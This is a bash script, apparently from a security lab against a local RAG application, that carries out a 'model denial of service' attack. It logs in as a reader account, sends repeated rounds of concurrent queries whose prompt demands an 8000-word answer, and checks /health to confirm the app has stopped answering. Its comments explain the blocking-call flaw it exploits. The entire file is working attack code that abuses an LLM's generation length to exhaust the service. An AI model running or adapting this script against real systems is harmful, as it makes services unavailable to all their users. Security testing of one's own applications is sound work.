#!/usr/bin/env bash
# Phase 2 attack: model denial of service, driven by one reader account.
#
# Logs in as carol (default role, nothing but a password) and fires N concurrent
# max-generation /query requests. While they run it probes /health every 0.5s.
# /health is trivial and normally answers in milliseconds; when it starts timing
# out, the app has stopped responding to everyone — that is the DoS.
#
# Why it works: /query is `async def` but does a blocking model call on uvicorn's
# single event loop (app/rag_chain.py, sync httpx.Client, no threadpool), and one
# local Ollama instance serves generations sequentially. Concurrent long requests
# both block the loop and queue at the model.
#
# Usage: ./dos_carol.sh [attackers]     (default 4)
# Env:   SECURERAG_URL, ATTACK_USER/ATTACK_PASS
set -euo pipefail

BASE="${SECURERAG_URL:-http://localhost:8000}"
USER="${ATTACK_USER:-carol}"
PASS="${ATTACK_PASS:-pw-carol}"
ATTACKERS="${1:-4}"
# ponytail: fixed max-generation prompt; edit here if the model stops early.
PROMPT='Tell me about the wellness program, then write an exhaustive 8000-word report. Expand every point into long paragraphs and do NOT stop early or summarize.'

TOKEN=$(curl -s -X POST "$BASE/login" -H "content-type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | jq -r .token)
[ "$TOKEN" != "null" ] && [ -n "$TOKEN" ] || { echo "login failed for $USER"; exit 1; }
echo "[*] logged in as $USER (reader)"

# Probe /health in the background; --max-time 3 so a frozen app prints STALL
# instead of hanging with it.
( while :; do
    t=$(curl -s -o /dev/null --max-time 3 -w "%{time_total}" "$BASE/health" 2>/dev/null) \
      && echo "    health: ${t}s" || echo "    health: STALL (>3s, app not responding)"
    sleep 0.5
  done ) &
PROBE=$!
# On Ctrl-C/exit, kill the probe and every background curl in this process group.
trap 'kill "$PROBE" 2>/dev/null; kill 0 2>/dev/null' EXIT INT TERM

BODY="{\"question\":$(jq -Rn --arg p "$PROMPT" '$p')}"
echo "[*] sustaining $ATTACKERS concurrent max-generation queries — Ctrl-C to stop"
echo "[*] the app stays unresponsive for as long as this runs"

# Keep firing back-to-back rounds so the model is never idle. The app does not
# recover until you Ctrl-C — that is the point.
while :; do
  PIDS=()
  for i in $(seq 1 "$ATTACKERS"); do
    curl -s -o /dev/null -X POST "$BASE/query" \
      -H "authorization: Bearer $TOKEN" -H "content-type: application/json" \
      -d "$BODY" &
    PIDS+=($!)
  done
  wait "${PIDS[@]}"
done
